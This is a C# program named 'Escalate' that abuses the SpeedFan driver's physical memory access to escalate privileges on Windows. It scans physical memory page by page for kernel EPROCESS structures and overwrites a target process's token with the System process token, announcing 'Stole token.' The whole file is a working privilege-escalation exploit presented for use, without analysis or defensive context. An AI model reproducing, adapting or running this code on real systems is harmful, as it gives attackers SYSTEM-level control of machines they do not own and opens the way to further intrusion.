using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Escalate.NTOSKernel;

namespace Escalate {
    class Program {
        private const int PageSize = 1 << 12;
        private const ulong PageOffsetMask = PageSize - 1;

        // Store the physical range start and end for memory and port I/O resources.
        private SortedDictionary<long, long> memoryMappings;

        // For each process ID store physical data which is useful when stealing the token.
        private Dictionary<int, PhysicalProcessData> processes;

        private SpeedFanDriver driver;

        #region WinAPI
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetPhysicallyInstalledSystemMemory(out long kilobytes);
        #endregion

        struct PhysicalProcessData {
            public string Name { get; set; }
            public long Address { get; set; }
            public long Token { get; set; }
        }

        private void GetMemoryMappings() {
            memoryMappings = new SortedDictionary<long, long>();

            // In this range, there are some mappings which are not recognized by Windows (they are very slow to access).
            // TODO: Where do these unmapped regions come from? (likely CPU)
            memoryMappings[0xF000_0000] = 0x1_0000_0000;

            // https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/cim-memorymappedio
            ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT * FROM CIM_MemoryMappedIO");
            foreach (ManagementObject obj in query.Get()) {
                ulong from = (ulong)obj.GetPropertyValue("StartingAddress"),
                    to = (ulong)obj.GetPropertyValue("EndingAddress");

                // Ignore any mappings in our "mystery" range, since they are covered manually.
                if(0xF000_0000 <= to && from <= 0x1_0000_0000) {
                    continue;
                }

                // We flag all pages affected by the memory region (since we traverse in pages).
                memoryMappings[(long)(from & ~PageOffsetMask)] = (long)((to + PageSize) & ~PageOffsetMask);
            }
        }

        private unsafe void ScanPage(IntPtr page, long address) {
            byte* from = (byte*)page.ToPointer(), to = from + PageSize;
            long AlignedEPROCESS = (Marshal.SizeOf<EPROCESS>() + 0xFF) & (-0x100);

            // Traverse all pools in the page.
            int blockSize = 0;
            for(byte *ptr = from; ptr < to; ptr += blockSize) {
                POOL_HEADER header = *(POOL_HEADER*)ptr;

                blockSize = header.BlockSize << 4;
                if (blockSize == 0 || blockSize > PageSize) {
                    return;
                }

                // Check for the "Proc" pool tag.
                if ((header.PoolTag & 0x7FFF_FFFF) != 0x636F_7250) {
                    continue;
                }

                if(blockSize < AlignedEPROCESS) {
                    return;
                }

                // The object is at the end of the pool, but alignment forces us to correct it up.
                byte* processPtr = ptr + blockSize - AlignedEPROCESS;
                EPROCESS process = *(EPROCESS*)processPtr;
                if (process.ExitStatus == 0 || process.PriorityClass != 2 || process.UniqueProcessId < 4 || process.UniqueProcessId > 50_000) {
                    // Santiy check to ensure we don't include dead/unwanted processes.
                    continue;
                }

                // In case we ever find the same process multiple times (which is possible), we care only about the last occurence.
                processes[process.UniqueProcessId] = new PhysicalProcessData() {
                    Address = address + processPtr - from,
                    Token = process.Token,
                    Name = Marshal.PtrToStringAnsi(new IntPtr(process.ImageFileName), 15).TrimEnd('\0')
                };
            }
        }

        private void StealToken(Process process) {
            if(!processes.ContainsKey(4) || !processes.ContainsKey(process.Id)) {
                throw new Exception("Could not find target processes.");
            }

            PhysicalProcessData systemData = processes[4], processData = processes[process.Id];

            // Check if the process names match (the EPROCESS data stores only the first X characters of the filename).
            // This is the last sanity check.
            if(!systemData.Name.Equals("System", StringComparison.InvariantCultureIgnoreCase) ||
                !(process.ProcessName + ".exe").StartsWith(processData.Name, StringComparison.InvariantCultureIgnoreCase)) {
                throw new Exception("Invalid process data.");
            }

            Console.WriteLine($"System token: {systemData.Token:X16}");
            Console.WriteLine($"Process token: {processData.Token:X16}");

            driver.WriteMemory(new IntPtr(processData.Address + Marshal.OffsetOf<EPROCESS>("Token").ToInt32()), systemData.Token);
        }

        public void Run(Process process) {
            GetMemoryMappings();

            long physicalMemorySize;
            GetPhysicallyInstalledSystemMemory(out physicalMemorySize);
            physicalMemorySize <<= 10;

            long maxAddressable = physicalMemorySize + memoryMappings.Sum(pair => pair.Value - pair.Key);
            Console.WriteLine("Scanning memory...");
            int cursorLeft = Console.CursorLeft, cursorTop = Console.CursorTop;

            processes = new Dictionary<int, PhysicalProcessData>();

            var mapping = memoryMappings.GetEnumerator();
            using (driver = new SpeedFanDriver()) {
                IntPtr page = Marshal.AllocHGlobal(PageSize);
                try {
                    long address = 0;
                    while (address < maxAddressable) {
                        // In case the current page is the start of a mapping, we skip the entire range.
                        if (address == mapping.Current.Key) {
                            address = mapping.Current.Value;
                            mapping.MoveNext();
                            continue;
                        }

                        if (address % (1 << 20) == 0) {
                            // Update the progress every megabyte.
                            Console.SetCursorPosition(cursorLeft, cursorTop);
                            Console.Write($"{address >> 20} / {maxAddressable >> 20} Mb");
                        }

                        driver.ReadMemory(new IntPtr(address), page, PageSize);
                        ScanPage(page, address);

                        address += PageSize;
                    }
                } finally {
                    Marshal.FreeHGlobal(page);
                }

                Console.WriteLine();
                Console.WriteLine("Done.");
                Console.WriteLine($"Found {processes.Count} processes.");

                StealToken(process);

                Console.WriteLine("Stole token.");
            }
        }

        public static void Main(string[] args) {
            if(args.Length == 0) {
                Console.WriteLine("Requires process name argument (without .exe), e.g. \"cmd\".");
                return;
            }
            Process process = Process.GetProcessesByName(args[0]).FirstOrDefault();
            if(process == null) {
                Console.WriteLine("Process not running.");
                return;
            }
            new Program().Run(process);
        }
    }
}
